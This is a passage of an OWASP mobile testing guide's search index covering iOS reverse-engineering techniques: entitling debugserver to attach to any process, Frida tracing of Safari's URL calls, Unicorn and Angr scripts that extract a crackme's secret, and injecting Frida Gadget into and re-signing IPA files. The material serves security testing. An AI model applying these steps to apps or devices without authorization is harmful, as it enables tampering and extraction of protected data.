analyze.</p>","tags":["ios","tech"]},{"location":"MASTG/techniques/ios/MASTG-TECH-0084/","title":"MASTG-TECH-0084: Debugging","text":"<p>Coming from a Linux background you'd expect the <code>ptrace</code> system call to be as powerful as you're used to but, for some reason, Apple decided to leave it incomplete. iOS debuggers such as LLDB use it for attaching, stepping or continuing the process but they cannot use it to read or write memory (all <code>PT_READ_*</code> and <code>PT_WRITE*</code> requests are missing). Instead, they have to obtain a so-called Mach task port (by calling <code>task_for_pid</code> with the target process ID) and then use the Mach IPC interface API functions to perform actions such as suspending the target process and reading/writing register states (<code>thread_get_state</code>/<code>thread_set_state</code>) and virtual memory (<code>mach_vm_read</code>/<code>mach_vm_write</code>).</p> <p>For more information you can refer to the LLVM project in GitHub which contains the source code for LLDB as well as Chapter 5 and 13 from \"Mac OS X and iOS Internals: To the Apple's Core\" [#levin] and Chapter 4 \"Tracing and Debugging\" from \"The Mac Hacker's Handbook\" [#miller].</p>","tags":["ios","tech"]},{"location":"MASTG/techniques/ios/MASTG-TECH-0084/#debugging-with-lldb","title":"Debugging with LLDB","text":"<p>The default debugserver executable that Xcode installs can't be used to attach to arbitrary processes (it is usually used only for debugging self-developed apps deployed with Xcode). To enable debugging of third-party apps, the <code>task_for_pid-allow</code> entitlement must be added to the debugserver executable so that the debugger process can call <code>task_for_pid</code> to obtain the target Mach task port as seen before. An easy way to do this is to add the entitlement to the debugserver binary shipped with Xcode.</p> <p>To obtain the executable, mount the following DMG image:</p> <pre><code>/Applications/Xcode.app/Contents/Developer/Platforms/iPhoneOS.platform/DeviceSupport/&lt;target-iOS-version&gt;/DeveloperDiskImage.dmg\n</code></pre> <p>You'll find the debugserver executable in the <code>/usr/bin/</code> directory on the mounted volume. Copy it to a temporary directory, then create a file called <code>entitlements.plist</code> with the following content:</p> <pre><code>&lt;?xml version=\"1.0\" encoding=\"UTF-8\"?&gt;\n&lt;!DOCTYPE plist PUBLIC \"-//Apple//DTD PLIST 1.0//EN\" \"http://www.apple.com/DTDs/ PropertyList-1.0.dtd\"&gt;\n&lt;plist version=\"1.0\"&gt;\n&lt;dict&gt;\n    &lt;key&gt;com.apple.springboard.debugapplications&lt;/key&gt;\n    &lt;true/&gt;\n    &lt;key&gt;run-unsigned-code&lt;/key&gt;\n    &lt;true/&gt;\n    &lt;key&gt;get-task-allow&lt;/key&gt;\n    &lt;true/&gt;\n    &lt;key&gt;task_for_pid-allow&lt;/key&gt;\n    &lt;true/&gt;\n&lt;/dict&gt;\n&lt;/plist&gt;\n</code></pre> <p>Apply the entitlement with  codesign:</p> <pre><code>codesign -s - --entitlements entitlements.plist -f debugserver\n</code></pre> <p>Copy the modified binary to any directory on the test device. The following examples use usbmuxd to forward a local port through USB.</p> <pre><code>iproxy 2222 22\nscp -P 2222 debugserver root@localhost:/tmp/\n</code></pre> <p>Note: On iOS 12 and higher, use the following procedure to sign the debugserver binary obtained from the XCode image.</p> <p>1) Copy the debugserver binary to the device via scp, for example, in the /tmp folder.</p> <p>2) Connect to the device via SSH and create the file, named entitlements.xml, with the following content:</p> <pre><code>&lt;!DOCTYPE plist PUBLIC \"-//Apple//DTD PLIST 1.0//EN http://www.apple.com/DTDs/PropertyList-1.0.dtd\"&gt;\n&lt;plist version=\"1.0\"&gt;\n&lt;dict&gt;\n   &lt;key&gt;platform-application&lt;/key&gt;\n   &lt;true/&gt;\n   &lt;key&gt;com.apple.private.security.no-container&lt;/key&gt;\n   &lt;true/&gt;\n   &lt;key&gt;com.apple.private.skip-library-validation&lt;/key&gt;\n   &lt;true/&gt;\n   &lt;key&gt;com.apple.backboardd.debugapplications&lt;/key&gt;\n   &lt;true/&gt;\n   &lt;key&gt;com.apple.backboardd.launchapplications&lt;/key&gt;\n   &lt;true/&gt;\n   &lt;key&gt;com.apple.diagnosticd.diagnostic&lt;/key&gt;\n   &lt;true/&gt;\n   &lt;key&gt;com.apple.frontboard.debugapplications&lt;/key&gt;\n   &lt;true/&gt;\n   &lt;key&gt;com.apple.frontboard.launchapplications&lt;/key&gt;\n   &lt;true/&gt;\n   &lt;key&gt;com.apple.security.network.client&lt;/key&gt;\n   &lt;true/&gt;\n   &lt;key&gt;com.apple.security.network.server&lt;/key&gt;\n   &lt;true/&gt;\n   &lt;key&gt;com.apple.springboard.debugapplications&lt;/key&gt;\n   &lt;true/&gt;\n   &lt;key&gt;com.apple.system-task-ports&lt;/key&gt;\n   &lt;true/&gt;\n   &lt;key&gt;get-task-allow&lt;/key&gt;\n   &lt;true/&gt;\n   &lt;key&gt;run-unsigned-code&lt;/key&gt;\n   &lt;true/&gt;\n   &lt;key&gt;task_for_pid-allow&lt;/key&gt;\n   &lt;true/&gt;\n&lt;/dict&gt;\n&lt;/plist&gt;\n</code></pre> <p>3) Type the following command to sign the debugserver binary using  ldid:</p> <pre><code>ldid -Sentitlements.xml debugserver\n</code></pre> <p>4) Verify that the debugserver binary can be executed via the following command:</p> <pre><code>./debugserver\n</code></pre> <p>You can now attach debugserver to any process running on the device.</p> <pre><code>VP-iPhone-18:/tmp root# ./debugserver *:1234 -a 2670\ndebugserver-@(#)PROGRAM:debugserver  PROJECT:debugserver-320.2.89\nfor armv7.\nAttaching to process 2670...\n</code></pre> <p>With the following command you can launch an application via debugserver running on the target device:</p> <pre><code>debugserver -x backboard *:1234 /Applications/MobileSMS.app/MobileSMS\n</code></pre> <p>Attach to an already running application:</p> <pre><code>debugserver *:1234 -a \"MobileSMS\"\n</code></pre> <p>You may connect now to the iOS device from your host computer:</p> <pre><code>(lldb) process connect connect://&lt;ip-of-ios-device&gt;:1234\n</code></pre> <p>Typing <code>image list</code> gives a list of main executable and all dependent libraries.</p>","tags":["ios","tech"]},{"location":"MASTG/techniques/ios/MASTG-TECH-0084/#debugging-release-apps","title":"Debugging Release Apps","text":"<p>In the previous section we learned about how to setup a debugging environment on an iOS device using LLDB. In this section we will use this information and learn how to debug a third-party release application. We will continue using the  iOS UnCrackable L1 and solve it using a debugger.</p> <p>In contrast to a debug build, the code compiled for a release build is optimized to achieve maximum performance and minimum binary build size. As a general best practice, most of the debug symbols are stripped for a release build, adding a layer of complexity when reverse engineering and debugging the binaries.</p> <p>Due to the absence of the debug symbols, symbol names are missing from the backtrace outputs and setting breakpoints by simply using function names is not possible. Fortunately, debuggers also support setting breakpoints directly on memory addresses. Further in this section we will learn how to do so and eventually solve the crackme challenge.</p> <p>Some groundwork is needed before setting a breakpoint using memory addresses. It requires determining two offsets:</p> <ol> <li>Breakpoint offset: The address offset of the code where we want to set a breakpoint. This address is obtained by performing static analysis of the code in a disassembler like Ghidra.</li> <li>ASLR shift offset: The ASLR shift offset for the current process. Since ASLR offset is randomly generated on every new instance of an application, this has to be obtained for every debugging session individually. This is determined using the debugger itself.</li> </ol> <p>iOS is a modern operating system with multiple techniques implemented to mitigate code execution attacks, one such technique being Address Space Randomization Layout (ASLR). On every new execution of an application, a random ASLR shift offset is generated, and various process' data structures are shifted by this offset.</p> <p>The final breakpoint address to be used in the debugger is the sum of the above two addresses (Breakpoint offset + ASLR shift offset). This approach assumes that the image base address (discussed shortly) used by the disassembler and iOS is the same, which is true most of the time.</p> <p>When a binary is opened in a disassembler like Ghidra, it loads a binary by emulating the respective operating system's loader. The address at which the binary is loaded is called image base address. All the code and symbols inside this binary can be addressed using a constant address offset from this image base address. In Ghidra, the image base address can be obtained by determining the address of the start of a Mach-O file. In this case, it is 0x100000000.</p> <p></p> <p>The value of the hidden string is stored in a label with the <code>hidden</code> flag set. In the disassembly, the text value of this label is stored in register <code>X21</code>, stored via <code>mov</code> from <code>X0</code>, at offset 0x100004520. This is our breakpoint offset.</p> <p></p> <p>For the second address, we need to determine the ASLR shift offset for a given process. The ASLR offset can be determined by using the LLDB command <code>image list -o -f</code>. The output is shown in the screenshot below.</p> <p></p> <p>In the output, the first column contains the sequence number of the image ([X]), the second column contains the randomly generated ASLR offset, while 3rd column contains the full path of the image and towards the end, content in the bracket shows the image base address after adding ASLR offset to the original image base address (0x100000000 + 0x70000 = 0x100070000). You will notice the image base address of 0x100000000 is same as in Ghidra. Now, to obtain the effective memory address for a code location we only need to add ASLR offset to the address identified in Ghidra. The effective address to set the breakpoint will be 0x100004520 + 0x70000 = 0x100074520. The breakpoint can be set using command <code>b 0x100074520</code>.</p> <p>In the above output, you may also notice that many of the paths listed as images do not point to the file system on the iOS device. Instead, they point to a certain location on the host computer on which LLDB is running. These images are system libraries for which debug symbols are available on the host computer to aid in application development and debugging (as part of the Xcode iOS SDK). Therefore, you may set breakpoints to these libraries directly by using function names.</p> <p>After putting the breakpoint and running the app, the execution will be halted once the breakpoint is hit. Now you can access and explore the current state of the process. In this case, you know from the previous static analysis that the register <code>X0</code> contains the hidden string, thus let's explore it. In LLDB you can print Objective-C objects using the <code>po</code> (print object) command.</p> <p></p> <p>Voila, the crackme can be easily solved aided by static analysis and a debugger. There are plethora of features implemented in LLDB, including changing the value of the registers, changing values in the process memory and even automating tasks using Python scripts.</p> <p>Officially Apple recommends use of LLDB for debugging purposes, but GDB can be also used on iOS. The techniques discussed above are applicable while debugging using GDB as well, provided the LLDB specific commands are changed to GDB commands.</p>","tags":["ios","tech"]},{"location":"MASTG/techniques/ios/MASTG-TECH-0085/","title":"MASTG-TECH-0085: Execution Tracing","text":"<p>Tracing involves recording the information about a program's execution. In contrast to Android, there are limited options available for tracing various aspects of an iOS app. In this section we will be heavily relying on tools such as Frida for performing tracing.</p> <p>TODO: This needs to be improved as well</p>","tags":["ios","tech"]},{"location":"MASTG/techniques/ios/MASTG-TECH-0086/","title":"MASTG-TECH-0086: Method Tracing","text":"<p>Intercepting Objective-C methods is a useful iOS security testing technique. For example, you may be interested in data storage operations or network requests. In the following example, we'll write a simple tracer for logging HTTP(S) requests made via iOS standard HTTP APIs. We'll also show you how to inject the tracer into the Safari web browser.</p> <p>In the following examples, we'll assume that you are working on a jailbroken device. If that's not the case, you first need to follow the steps outlined in  Injecting Frida Gadget into an IPA Automatically to repackage the Safari app with the Frida Gadget.</p> <p>Frida comes with <code>frida-trace</code>, a function tracing tool. <code>frida-trace</code> accepts Objective-C methods via the <code>-m</code> flag. You can pass it wildcards as well-given <code>-[NSURL *]</code>, for example, <code>frida-trace</code> will automatically install hooks on all <code>NSURL</code> class selectors. We'll use this to get a rough idea about which library functions Safari calls when the user opens a URL.</p> <p>Run Safari on the device and make sure the device is connected via USB. Then start <code>frida-trace</code> as follows:</p> <pre><code>$ frida-trace -U -m \"-[NSURL *]\" Safari\nInstrumenting functions...\n-[NSURL isMusicStoreURL]: Loaded handler at \"/Users/berndt/Desktop/__handlers__/__NSURL_isMusicStoreURL_.js\"\n-[NSURL isAppStoreURL]: Loaded handler at \"/Users/berndt/Desktop/__handlers__/__NSURL_isAppStoreURL_.js\"\n(...)\nStarted tracing 248 functions. Press Ctrl+C to stop.\n</code></pre> <p>Next, navigate to a new website in Safari. You should see traced function calls on the <code>frida-trace</code> console. Note that the <code>initWithURL:</code> method is called to initialize a new URL request object.</p> <pre><code>           /* TID 0xc07 */\n  20313 ms  -[NSURLRequest _initWithCFURLRequest:0x1043bca30 ]\n 20313 ms  -[NSURLRequest URL]\n(...)\n 21324 ms  -[NSURLRequest initWithURL:0x106388b00 ]\n 21324 ms     | -[NSURLRequest initWithURL:0x106388b00 cachePolicy:0x0 timeoutInterval:0x106388b80\n</code></pre>","tags":["ios","tech"]},{"location":"MASTG/techniques/ios/MASTG-TECH-0087/","title":"MASTG-TECH-0087: Native Code Tracing","text":"<p>As discussed earlier in this chapter, iOS applications can also contain native code (C/C++ code) and it can be traced using the <code>frida-trace</code> CLI as well. For example, you can trace calls to the <code>open</code> function by running the following command:</p> <pre><code>frida-trace -U -i \"open\" sg.vp.UnCrackable1\n</code></pre> <p>The overall approach and further improvisation for tracing native code using Frida is similar to the one discussed in  Native Code Tracing.</p> <p>Unfortunately, there are no tools such as <code>strace</code> or <code>ftrace</code> available to trace syscalls or function calls of an iOS app. Only <code>DTrace</code> exists, which is a very powerful and versatile tracing tool, but it's only available for MacOS and not for iOS.</p>","tags":["ios","tech"]},{"location":"MASTG/techniques/ios/MASTG-TECH-0088/","title":"MASTG-TECH-0088: Emulation-based Analysis","text":"","tags":["ios","tech"]},{"location":"MASTG/techniques/ios/MASTG-TECH-0088/#ios-simulator","title":"iOS Simulator","text":"<p>Apple provides a simulator app within Xcode which provides a real iOS device looking user interface for iPhone, iPad or Apple Watch. It allows you to rapidly prototype and test debug builds of your applications during the development process, but actually it is not an emulator. Difference between a simulator and an emulator is previously discussed in \"Emulation-based Dynamic Analysis\" section.</p> <p>While developing and debugging an application, the Xcode toolchain generates x86 code, which can be executed in the iOS simulator. However, for a release build, only ARM code is generated (incompatible with the iOS simulator). That's why applications downloaded from the Apple App Store cannot be used for any kind of application analysis on the iOS simulator.</p>","tags":["ios","tech"]},{"location":"MASTG/techniques/ios/MASTG-TECH-0088/#corellium","title":"Corellium","text":"<p>Corellium is a commercial tool which offers virtual iOS devices running actual iOS firmware, being the only publicly available iOS emulator ever. Since it is a proprietary product, not much information is available about the implementation. Corellium has no community licenses available, therefore we won't go into much detail regarding its use.</p> <p>Corellium allows you to launch multiple instances of a device (jailbroken or not) which are accessible as local devices (with a simple VPN configuration). It has the ability to take and restore snapshots of the device state, and also offers a convenient web-based shell to the device. Finally and most importantly, due to its \"emulator\" nature, you can execute applications downloaded from the Apple App Store, enabling any kind of application analysis as you know it from real iOS (jailbroken) devices.</p> <p>Note that in order to install an IPA on Corellium devices it has to be unencrypted and signed with a valid Apple developer certificate. See more information here.</p>","tags":["ios","tech"]},{"location":"MASTG/techniques/ios/MASTG-TECH-0088/#unicorn","title":"Unicorn","text":"<p>Unicorn is a lightweight, multi-architecture CPU emulator framework based on QEMU and goes beyond it by adding useful features especially made for CPU emulation. Unicorn provides the basic infrastructure needed to execute processor instructions. In this section we will use Unicorn's Python bindings to solve the  iOS UnCrackable L1 challenge.</p> <p>To use Unicorn's full power, we would need to implement all the necessary infrastructure which generally is readily available from the operating system, e.g. binary loader, linker and other dependencies or use another higher level frameworks such as Qiling which leverages Unicorn to emulate CPU instructions, but understands the OS context. However, this is superfluous for this very localized challenge where only executing a small part of the binary will suffice.</p> <p>While performing manual analysis in  Reviewing Disassembled Native Code, we determined that the function at address 0x1000080d4 is responsible for dynamically generating the secret string. As we're about to see, all the necessary code is pretty much self-contained in the binary, making this a perfect scenario to use a CPU emulator like Unicorn.</p> <p></p> <p>If we analyze that function and the subsequent function calls, we will observe that there is no hard dependency on any external library and neither it's performing any system calls. The only access external to the functions occurs for instance at address 0x1000080f4, where a value is being stored to address 0x10000dbf0, which maps to the <code>__data</code> section.</p> <p>Therefore, in order to correctly emulate this section of the code, apart from the <code>__text</code> section (which contains the instructions) we also need to load the <code>__data</code> section.</p> <p>To solve the challenge using Unicorn we will perform the following steps:</p> <ul> <li>Get the ARM64 version of the binary by running <code>lipo -thin arm64 &lt;app_binary&gt; -output uncrackable.arm64</code> (ARMv7 can be used as well).</li> <li>Extract the <code>__text</code> and <code>__data</code> section from the binary.</li> <li>Create and map the memory to be used as stack memory.</li> <li>Create memory and load the <code>__text</code> and <code>__data</code> section.</li> <li>Execute the binary by providing the start and end address.</li> <li>Finally, dump the return value from the function, which in this case is our secret string.</li> </ul> <p>To extract the content of <code>__text</code> and <code>__data</code> section from the Mach-O binary we will use LIEF, which provides a convenient abstraction to manipulate multiple executable file formats. Before loading these sections to memory, we need to determine their base addresses, e.g. by using Ghidra, Radare2 or IDA Pro.</p> <p></p> <p>From the above table, we will use the base address 0x10000432c for <code>__text</code> and 0x10000d3e8 for <code>__data</code> section to load them at in the memory.</p> <p>While allocating memory for Unicorn, the memory addresses should be 4k page aligned and also the allocated size should be a multiple of 1024.</p> <p>The following script emulates the function at 0x1000080d4 and dumps the secret string:</p> <pre><code>import lief\nfrom unicorn import *\nfrom unicorn.arm64_const import *\n\n# --- Extract __text and __data section content from the binary ---\nbinary = lief.parse(\"uncrackable.arm64\")\ntext_section = binary.get_section(\"__text\")\ntext_content = text_section.content\n\ndata_section = binary.get_section(\"__data\")\ndata_content = data_section.content\n\n# --- Setup Unicorn for ARM64 execution ---\narch = \"arm64le\"\nemu = Uc(UC_ARCH_ARM64, UC_MODE_ARM)\n\n# --- Create Stack memory ---\naddr = 0x40000000\nsize = 1024*1024\nemu.mem_map(addr, size)\nemu.reg_write(UC_ARM64_REG_SP, addr + size - 1)\n\n# --- Load text section --\nbase_addr = 0x100000000\ntmp_len = 1024*1024\ntext_section_load_addr = 0x10000432c\nemu.mem_map(base_addr, tmp_len)\nemu.mem_write(text_section_load_addr, bytes(text_content))\n\n# --- Load data section ---\ndata_section_load_addr = 0x10000d3e8\nemu.mem_write(data_section_load_addr, bytes(data_content))\n\n# --- Hack for stack_chk_guard ---\n# without this will throw invalid memory read at 0x0\nemu.mem_map(0x0, 1024)\nemu.mem_write(0x0, b\"00\")\n\n\n# --- Execute from 0x1000080d4 to 0x100008154 ---\nemu.emu_start(0x1000080d4, 0x100008154)\nret_value = emu.reg_read(UC_ARM64_REG_X0)\n\n# --- Dump return value ---\nprint(emu.mem_read(ret_value, 11))\n</code></pre> <p>You may notice that there is an additional memory allocation at address 0x0, this is a simple hack around <code>stack_chk_guard</code> check. Without this, there will be a invalid memory read error and binary cannot be executed. With this hack, the program will access the value at 0x0 and use it for the <code>stack_chk_guard</code> check.</p> <p>To summarize, using Unicorn do require some additional setup before executing the binary, but once done, this tool can help to provide deep insights into the binary. It provides the flexibility to execute the full binary or a limited part of it. Unicorn also exposes APIs to attach hooks to the execution. Using these hooks you can observe the state of the program at any point during the execution or even manipulate the register or variable values and forcefully explore other execution branches in a program. Another advantage when running a binary in Unicorn is that you don't need to worry about various checks like root/jailbreak detection or debugger detection etc.</p>","tags":["ios","tech"]},{"location":"MASTG/techniques/ios/MASTG-TECH-0089/","title":"MASTG-TECH-0089: Symbolic Execution","text":"<p>You can find an introduction to binary analysis using binary analysis frameworks in  Dynamic Analysis on Android. We recommend you to revisit that content and refresh the concepts on this subject.</p> <p>For Android, we used Angr's symbolic execution engine to solve a challenge. In this section, we will firstly use Unicorn to solve the  iOS UnCrackable L1 challenge and then we will revisit the Angr binary analysis framework to analyze the challenge but instead of symbolic execution we will use its concrete execution (or dynamic execution) features.</p>","tags":["ios","tech"]},{"location":"MASTG/techniques/ios/MASTG-TECH-0089/#angr","title":"Angr","text":"<p> Angr is a very versatile tool, providing multiple techniques to facilitate binary analysis, while supporting various file formats and hardware instructions sets.</p> <p>The Mach-O backend in Angr is not well-supported, but it works perfectly fine for our case.</p> <p>While manually analyzing the code in  Reviewing Disassembled Native Code, we reached a point where performing further manual analysis was cumbersome. The function at offset <code>0x1000080d4</code> was identified as the final target which contains the secret string.</p> <p>If we revisit that function, we can see that it involves multiple sub-function calls and interestingly none of these functions have any dependencies on other library calls or system calls. This is a perfect case to use Angr's concrete execution engine. Follow the steps below to solve this challenge:</p> <ul> <li>Get the ARM64 version of the binary by running <code>lipo -thin arm64 &lt;app_binary&gt; -output uncrackable.arm64</code> (ARMv7 can be used as well).</li> <li>Create an Angr <code>Project</code> by loading the above binary.</li> <li>Get a <code>callable</code> object by passing the address of the function to be executed. From the Angr documentation: \"A Callable is a representation of a function in the binary that can be interacted with like a native python function.\".</li> <li>Pass the above <code>callable</code> object to the concrete execution engine, which in this case is <code>claripy.backends.concrete</code>.</li> <li>Access the memory and extract the string from the pointer returned by the above function.</li> </ul> <pre><code>import angr\nimport claripy\n\ndef solve():\n\n    # Load the binary by creating angr project.\n    project = angr.Project('uncrackable.arm64')\n\n    # Pass the address of the function to the callable\n    func = project.factory.callable(0x1000080d4)\n\n    # Get the return value of the function\n    ptr_secret_string = claripy.backends.concrete.convert(func()).value\n    print(\"Address of the pointer to the secret string: \" + hex(ptr_secret_string))\n\n    # Extract the value from the pointer to the secret string\n    secret_string = func.result_state.mem[ptr_secret_string].string.concrete\n    print(f\"Secret String: {secret_string}\")\n\nsolve()\n</code></pre> <p>Above, Angr executed an ARM64 code in an execution environment provided by one of its concrete execution engines. The result is accessed from the memory as if the program is executed on a real device. This case is a good example where binary analysis frameworks enable us to perform a comprehensive analysis of a binary, even in the absence of specialized devices needed to run it.</p>","tags":["ios","tech"]},{"location":"MASTG/techniques/ios/MASTG-TECH-0090/","title":"MASTG-TECH-0090: Injecting Frida Gadget into an IPA Automatically","text":"<p>If you want to enable dynamic testing with Frida but don't have access to a jailbroken device, you can patch and repackage the target app to load the Frida gadget. This way, you can instrument the app and do everything you need to do for dynamic analysis (of course, you can't break out of the sandbox this way). However, this technique only works if the app binary isn't FairPlay-encrypted (i.e., obtained from the App Store).</p> <p>On a jailbroken device, you can run <code>frida-server</code> which will take care of the injection for you, even in encrypted apps. However, on a non-jailbroken device we have to manually prepare the application. There are two approaches we can take:</p> <ul> <li>Install a debug version of the application and inject during application launch</li> <li>Repackage the application to already include the Frida Gadget</li> </ul> <p>As an alternative to this automated approach, see  Injecting Libraries into an IPA Manually.</p> <p>You can inject Frida into an application using  Sideloadly or  objection</p>","tags":["ios","tech"]},{"location":"MASTG/techniques/ios/MASTG-TECH-0090/#frida","title":"Frida","text":"<p>After following any of the techniques of  Launching a Repackaged App in Debug Mode, your application will be running with the <code>get-task-allow</code> entitlement, which means it can be debugged. This means that the <code>frida</code> CLI tool can spawn the application and inject the Frida Gadget automatically, even on non-jailbroken devices.</p> <p>First, download the latest version of the Frida Gadget and move it to <code>/Users/&lt;USER&gt;/.cache/frida/gadget-ios.dylib</code>. Frida is released frequently, so find the latest version available on the Github releases page or download via the command line after obtaining the latest URL:</p> <pre><code>wget https://github.com/frida/frida/releases/download/X.Y.Z/frida-gadget-X.Y.Z-ios-universal.dylib.gz\ngzip -d frida-gadget-X.Y.Z-ios-universal.dylib.gz\nmv frida-gadget-X.Y.Z-ios-universal.dylib /Users/MAS/.cache/frida/gadget-ios.dylib\n</code></pre> <p>Next, simply run <code>frida</code> as you would normally:</p> <pre><code>$ frida -U -f org.mas.myapp\n     ____\n    / _  |   Frida 16.5.9 - A world-class dynamic instrumentation toolkit\n   | (_| |\n    &gt; _  |   Commands:\n   /_/ |_|       help      -&gt; Displays the help system\n   . . . .       object?   -&gt; Display information about 'object'\n   . . . .       exit/quit -&gt; Exit\n   . . . .\n   . . . .   More info at https://frida.re/docs/home/\n   . . . .\n   . . . .   Connected to iPhone (id=123456789)\nSpawned `org.mas.myapp`. Resuming main thread!\n[iPhone::org.mas.myapp]-&gt;\n</code></pre>","tags":["ios","tech"]},{"location":"MASTG/techniques/ios/MASTG-TECH-0090/#sideloadly","title":"Sideloadly","text":"<p>Sideloadly can be used to automatically inject libraries while repackaging and signing the app. To do so, click the <code>Advanced Options</code>, followed by <code>Inject dylibs/frameworks</code> and <code>+dylib/deb/bundle</code>:</p> <p></p> <p>After installation, you will not be able to launch the application from SpringBoard. However, you can launch the application in debug mode and attach Frida as explained in  Launching a Repackaged App in Debug Mode.</p>","tags":["ios","tech"]},{"location":"MASTG/techniques/ios/MASTG-TECH-0090/#objection","title":"Objection","text":"<p>Objection can inject the Frida Gadget into a given IPA file. Use a computer with macOS to perform all the steps indicated in the article \"Patching iOS Applications\" from the objection Wiki. Once you're done you'll be able to patch an IPA by calling the objection command:</p> <pre><code>objection patchipa --source my-app.ipa --codesign-signature 0C2E8200Dxxxx\n</code></pre>","tags":["ios","tech"]},{"location":"MASTG/techniques/ios/MASTG-TECH-0091/","title":"MASTG-TECH-0091: Injecting Libraries into an IPA Manually","text":"<p>This technique allows you to inject arbitrary libraries into an IPA file. After injecting the library, you'll have to install the modified IPA onto your device using  Installing Apps.</p> <p>This technique is useful when you want to add additional functionality or testing capabilities to an application. For example, you can inject the Frida Gadget into an IPA file to enable dynamic instrumentation of the application.</p> <p>We'll use the Frida Gadget (<code>FridaGadget.dylib</code>) as an example but you can use this technique to inject any <code>.dylib</code> library you want.</p>","tags":["ios","tech"]},{"location":"MASTG/techniques/ios/MASTG-TECH-0091/#obtaining-the-library","title":"Obtaining the Library","text":"<p>In our example, the library is Frida Gadget, which can be downloaded from the GitHub release page of the Frida project. Look for the latest release that matches your target platform and download the <code>frida-gadget-XX.YY.ZZ-ios-universal.dylib.xz</code> file.</p> <p>Decompress the file using the <code>xz</code> tool and save it as <code>FridaGadget.dylib</code>:</p> <pre><code>xz -d &lt;frida-gadget-XX.YY.ZZ-ios-universal.dylib.xz&gt; -c &gt; FridaGadget.dylib\n</code></pre>","tags":["ios","tech"]},{"location":"MASTG/techniques/ios/MASTG-TECH-0091/#adding-the-library-to-the-ipa","title":"Adding the Library to the IPA","text":"<p>IPA files are ZIP archives, so you can use any ZIP tool to unpack the archive:</p> <pre><code>unzip UnCrackable-Level1.ipa\n</code></pre> <p>Next, copy the target library, in this case <code>FridaGadget.dylib</code>, into the <code>.app/Frameworks</code> directory (create the directory if it doesn't exist):</p> <pre><code>mkdir -p Payload/UnCrackable\\ Level\\ 1.app/Frameworks\ncp FridaGadget.dylib Payload/UnCrackable\\ Level\\ 1.app/Frameworks/\n</code></pre> <p>Use  optool to add a <code>load</code> command to the binary (<code>LC_LOAD_DYLIB</code>). The code below shows how this is done for the  iOS UnCrackable L1:</p> <pre><code>optool install -c load -p \"@executable_path/Frameworks/FridaGadget.dylib\"  -t Payload/UnCrackable\\ Level\\ 1.app/UnCrackable\\ Level\\ 1\n\nFound FAT Header\nFound thin header...\nFound thin header...\nInserting a LC_LOAD_DYLIB command for architecture: arm\nSuccessfully inserted a LC_LOAD_DYLIB command for arm\nInserting a LC_LOAD_DYLIB command for architecture: arm64\nSuccessfully inserted a LC_LOAD_DYLIB command for arm64\nWriting executable to Payload/UnCrackable Level 1.app/UnCrackable Level 1...\n</code></pre> <p>After injecting the <code>load</code> command, you need to repackage the IPA:</p> <pre><code>zip -r patched.ipa Payload\n</code></pre> <p>To debug an iOS application obtained from the App Store, it needs to be re-signed with a development provisioning profile with the <code>get-task-allow</code> entitlement. How to re-sign an application is discussed in  Obtaining a Developer Provisioning Profile.</p>","tags":["ios","tech"]},{"location":"MASTG/techniques/ios/MASTG-TECH-0092/","title":"MASTG-TECH-0092: Signing IPA files","text":"<p>To install an IPA file on a non-jailbroken device, it needs to have a valid signature. On a jailbroken device, this is not required after installing  AppSync Unified.</p> <p>First, you need to obtain a developer provisioning profile and certificate, as explained in  Obtaining a Developer Provisioning Profile.</p> <p>Warning</p> <p>If you have a normal Apple account, you will only be able to sign the IPA with a modified (unique) Bundle identifier. If you have a Developer account, you can sign with the original Bundle identifier.</p> <p>The signing process can be done using  ios-app-signer,  fastlane,  Sideloadly or  codesign.</p>","tags":["ios","tech"]},{"location":"MASTG/techniques/ios/MASTG-TECH-0092/#using-fastlane","title":"Using fastlane","text":"<p>Create a directory <code>fastlane</code> and create a <code>Fastfile</code> file as described in the documentation for resigning. Put both the <code>Fastfile</code> and your IPA in the <code>fastlane</code> directory.</p> <p>Example:</p> <pre><code>lane :resignipa do\n  resign(\n    ipa: \"./filename.ipa\",\n    signing_identity: \"Apple Development: MAS@owasp.org (LVGBSLUQB4)\",\n    provisioning_profile: \"./embedded.mobileprovision\",\n  )\nend\n</code></pre> <p>Afterwards, execute the <code>fastlane resignipa</code> command.</p> <pre><code>$ fastlane resignipa\n[\u2714] \ud83d\ude80 \n[15:21:51]: Get started using a Gemfile for fastlane https://docs.fastlane.tools/getting-started/ios/setup/#use-a-gemfile\n[15:21:52]: Driving the lane 'resignipa' \ud83d\ude80\n[15:21:52]: --------------------\n[15:21:52]: --- Step: resign ---\n[15:21:52]: --------------------\n...\n[15:22:03]: Successfully signed /test.ipa!\n[15:22:03]: Successfully re-signed .ipa \ud83d\udd0f.\n\n+-----------------------------+\n|      fastlane summary       |\n+------+--------+-------------+\n| Step | Action | Time (in s) |\n+------+--------+-------------+\n| 1    | resign | 11          |\n+------+--------+-------------+\n\n[15:22:03]: fastlane.tools finished successfully \ud83c\udf89\n</code></pre> <p>Once this is set up, all you need to do is change the path in the <code>Fastfile</code> for the IPA you want to resign and run the command again.</p> <p>More information can be found in the official documentation: \"Codesign an existing ipa file with fastlane resign\"</p> <p>Warning</p> <p>By default, fastlane will always use the Bundle identifier from the given provisioning profile, both for normal Apple accounts and Developer accounts. If you have a Developer account, you can specify the desired Bundle identifier by directly using the <code>resign.sh</code> script bundled with Fastlane and specifying the <code>--bundle-id</code> property:</p> <pre><code>$ /opt/homebrew/Cellar/fastlane/2.226.0/libexec/gems/fastlane-2.226.0/sigh/lib/assets/resign.sh /Users/MAS/uncrackable1.ipa &lt;CERTIFICATE&gt; -p /Users/MAS/embedded.mobileprovision /Users/MAS/signed.ipa -v --bundle-id \"org.mas.myapp\"\n\nSpecified provisioning profile: '/Users/MAS/embedded.mobileprovision'\nOriginal file: '/Users/MAS/uncrackable1.ipa'\nCertificate: '&lt;CERTIFICATE&gt;'\nSpecified bundle identifier: 'org.mas.myapp'\nOutput file name: '/Users/MAS/signed.ipa'\nCurrent bundle identifier is: 'org.mas.testapp'\nNew bundle identifier will be: 'org.mas.myapp'\nValidating the new provisioning profile: /Users/MAS/embedded.mobileprovision\nProfile app identifier prefix is '6FZT6QZ6X3'\nProfile team identifier is '6FZT6QZ6X3'\nUpdating the bundle identifier from 'org.mas.testapp' to 'org.mas.myapp'\nFixing nested app and extension references\nExtracting entitlements from provisioning profile\nResigning application using certificate: '&lt;CERTIFICATE&gt;'\nand entitlements from provisioning profile: /Users/MAS/embedded.mobileprovision\n_floatsignTemp/Payload/UnCrackable Level 1.app: replacing existing signature\n_floatsignTemp/Payload/UnCrackable Level 1.app: signed app bundle with Mach-O universal (armv7 arm64) [org.mas.myapp]\nRepackaging as 